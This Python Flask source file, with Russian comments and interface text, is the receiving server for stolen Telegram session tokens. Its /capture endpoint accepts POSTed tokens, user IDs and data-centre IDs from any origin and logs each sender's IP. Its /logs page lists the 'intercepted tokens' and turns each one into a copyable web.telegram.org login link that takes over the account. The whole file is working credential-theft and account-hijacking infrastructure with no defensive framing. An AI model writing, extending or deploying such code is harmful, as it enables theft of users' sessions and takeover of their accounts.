from flask import Flask, request, jsonify, render_template_string
from flask_cors import CORS
from datetime import datetime

app = Flask(__name__)
CORS(app)

tokens = []

@app.route('/capture', methods=['POST', 'OPTIONS'])
def capture():
    if request.method == 'OPTIONS':
        response = app.make_default_options_response()
        response.headers['Access-Control-Allow-Origin'] = '*'
        response.headers['Access-Control-Allow-Methods'] = 'POST, OPTIONS'
        response.headers['Access-Control-Allow-Headers'] = 'Content-Type'
        return response

    data = request.get_json()
    if data and 'token' in data:
        entry = {
            'token': data.get('token'),
            'userid': data.get('userid'),
            'dcid': data.get('dcid'),
            'timestamp': data.get('timestamp') or datetime.utcnow().isoformat(),
            'ip': request.remote_addr
        }
        tokens.append(entry)
        print(f"[+] Токен: {entry['token'][:20]}..., userid: {entry['userid']}, dcid: {entry['dcid']}")
        return '', 200
    return '', 400

@app.route('/logs', methods=['GET'])
def logs():
    # Если запрос от браузера – показываем HTML
    if request.headers.get('Accept', '').find('text/html') != -1:
        html = '''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Перехваченные токены</title>
            <style>
                body { font-family: Arial, sans-serif; padding: 20px; background: #f9f9f9; }
                h1 { color: #333; }
                .entry {
                    background: white;
                    border: 1px solid #ddd;
                    padding: 18px;
                    margin-bottom: 25px;
                    border-radius: 8px;
                    box-shadow: 0 2px 4px rgba(0,0,0,0.05);
                }
                .entry hr {
                    margin: 12px 0;
                    border: 0;
                    border-top: 1px solid #eee;
                }
                .token {
                    font-family: 'Courier New', monospace;
                    word-break: break-all;
                    background: #f5f5f5;
                    padding: 4px 8px;
                    border-radius: 4px;
                }
                .meta {
                    color: #666;
                    font-size: 0.9em;
                    margin-top: 5px;
                }
                .link {
                    margin-top: 12px;
                    display: flex;
                    align-items: center;
                    gap: 10px;
                    flex-wrap: wrap;
                }
                .link input {
                    flex: 1;
                    padding: 8px;
                    border: 1px solid #ccc;
                    border-radius: 4px;
                    font-size: 14px;
                    background: #fafafa;
                }
                .copy-btn {
                    background: #007bff;
                    color: white;
                    border: none;
                    padding: 8px 18px;
                    border-radius: 4px;
                    cursor: pointer;
                    font-weight: bold;
                }
                .copy-btn:hover {
                    background: #0056b3;
                }
                .separator {
                    border-top: 2px solid #333;
                    margin: 30px 0;
                }
                .no-tokens {
                    color: #888;
                    font-style: italic;
                }
            </style>
        </head>
        <body>
            <h1>📨 Перехваченные токены ({{ tokens|length }})</h1>
            {% if tokens %}
                {% for entry in tokens %}
                <div class="entry">
                    <div><strong>Токен:</strong> <span class="token">{{ entry.token }}</span></div>
                    <div><strong>UserID:</strong> {{ entry.userid or 'N/A' }}</div>
                    <div><strong>DCID:</strong> {{ entry.dcid or 'N/A' }}</div>
                    <div class="meta"><strong>Время:</strong> {{ entry.timestamp }}</div>
                    <div class="meta"><strong>IP:</strong> {{ entry.ip }}</div>
                    <div class="link">
                        <input type="text" value="https://web.telegram.org/a/#tgWebAuthToken={{ entry.token }}" readonly>
                        <button class="copy-btn" onclick="copyToClipboard(this.previousElementSibling.value)">Копировать</button>
                    </div>
                    <hr>
                </div>
                {% endfor %}
            {% else %}
                <p class="no-tokens">Пока нет перехваченных токенов.</p>
            {% endif %}

            <script>
                function copyToClipboard(text) {
                    navigator.clipboard.writeText(text)
                        .then(() => alert('✅ Ссылка скопирована!'))
                        .catch(() => {
                            // fallback для старых браузеров
                            const textarea = document.createElement('textarea');
                            textarea.value = text;
                            document.body.appendChild(textarea);
                            textarea.select();
                            document.execCommand('copy');
                            document.body.removeChild(textarea);
                            alert('✅ Ссылка скопирована!');
                        });
                }
            </script>
        </body>
        </html>
        '''
        # Показываем записи в обратном порядке (сначала свежие)
        return render_template_string(html, tokens=tokens[::-1])
    else:
        # Для API-запросов возвращаем JSON
        return jsonify(tokens)

if __name__ == '__main__':
    import os
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
